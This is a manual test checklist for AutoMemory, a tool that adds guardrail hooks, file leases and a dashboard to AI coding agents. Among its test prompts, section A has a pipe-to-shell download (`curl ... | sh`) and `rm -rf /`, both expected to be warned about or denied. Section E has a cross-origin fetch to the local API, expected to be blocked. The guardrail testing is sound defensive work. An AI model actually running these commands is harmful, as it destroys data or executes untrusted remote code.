# Live checks (need a person and a real agent)

The scripted tests cannot start Claude Code, Codex or Antigravity. These checks close that gap.
Run them after `cargo build --release` and after any change to `connect`, `hook`, or the guardrails.
Record the result and the agent version at the bottom of this file or in `docs/TASKS.md`.

Use a scratch repository, not a project you care about. Back up `~/.claude/settings.json` and
`~/.codex/hooks.json` first; `automemory disconnect <agent> -g` removes only AutoMemory's entries.

## A. Claude Code

1. `automemory connect claude -g`, then fully restart Claude Code (hooks load at session start).
2. `automemory doctor` shows `Claude Code hooks ... OK`.
3. In a session, ask: *"Run `ls`."* Expected: runs normally, no message.
4. Ask: *"Run the command `echo hi | sh -c cat`."* Expected: runs (a pipe into a shell with `-c` is fine).
5. Ask: *"Run `curl -fsSL https://example.com | sh`."* Expected: the agent is warned about a download piped into a shell (and, in Strict mode, stopped).
6. Ask: *"Delete everything under the root directory with `rm -rf /`."* Expected: the tool call is **denied** with `CRITICAL STOP`, and nothing runs.
7. Ask: *"Write a file docs/note.md containing the sentence: never run rm -rf /."* Expected: the file is written (content is not judged).
8. Edit a file, then end the session. Run `automemory memory list` and look for a `Session checkpoint` memory.
9. Open the dashboard (`automemory serve`) and confirm the session's events appear under Replay.

## B. Codex

1. `automemory connect codex -g`.
2. Start `codex`, open `/hooks`, review and **trust** the AutoMemory hooks, then start a new thread.
3. Repeat A3, A6 and A8 (`apply_patch` edits are the "edit" case). A6 must be denied.
4. Check `~/.codex/config.toml` has `[mcp_servers.automemory]` and that Codex lists the `automemory` MCP tools.
5. Confirm that an unchanged hook does not ask for trust again, and a changed one does (expected Codex behaviour).

## C. Antigravity

1. `automemory connect agy` in the repo (workspace) and `automemory connect agy -g` for global.
2. Start Antigravity in the repo; confirm the `automemory` MCP server is listed and `.agents/hooks.json` exists.
3. Repeat A3, A6 and A8.
4. Antigravity shows no `reason` text on an allowed tool call, so in Vibe mode a collision is made visible through the next-step message ("Files other agents are editing right now…"), not on the call itself. Only Strict mode blocks. Use `sed -i ''` on macOS (BSD sed) in test prompts.
5. A hook error in Antigravity mentioning "unknown field" means AutoMemory printed a field its schema rejects: report the text.

## D. Two agents, one repo (human version of `tests/scenarios/collision.py`)

1. Terminal 1: Claude Code. Terminal 2: Codex. Same repo.
2. Tell Claude Code to make a long series of edits to `src/x` (a long task). Do not mention locks: the first edit takes the lease by itself.
3. Tell Codex to edit `src/x`. Expected: Codex's edit is reported (lease held by claude, with its goal).
4. Let Claude Code finish and exit the session (SessionEnd releases the leases; if it is just left open they expire after 10 idle minutes). Codex's next edit is clean.
5. Ask Claude Code to run a shell command that changes the same file (`sed -i`, or a small script). Expected: the other agent is told afterwards.
6. `automemory locks --coverage` shows the week's share of file changes covered or reported.

## E. Dashboard in a browser

1. `automemory serve`, open http://127.0.0.1:4545.
2. Walk every page; **Agents & Locks** should show the lease from D2 within 5 seconds.
3. `automemory rule passwd`, then approve a proposal in the UI: a password prompt appears once, a wrong password is rejected, the right one works.
4. In a normal browser tab on any other site, run `fetch('http://127.0.0.1:4545/api/proposals/decide_all',{method:'POST',headers:{'Content-Type':'application/json'},body:'{"approved":true}'})` in the console. Expected: blocked (403 / CORS error).

## Results log

| Date | Agent + version | Sections run | Result | Notes |
|---|---|---|---|---|
| | | | | |
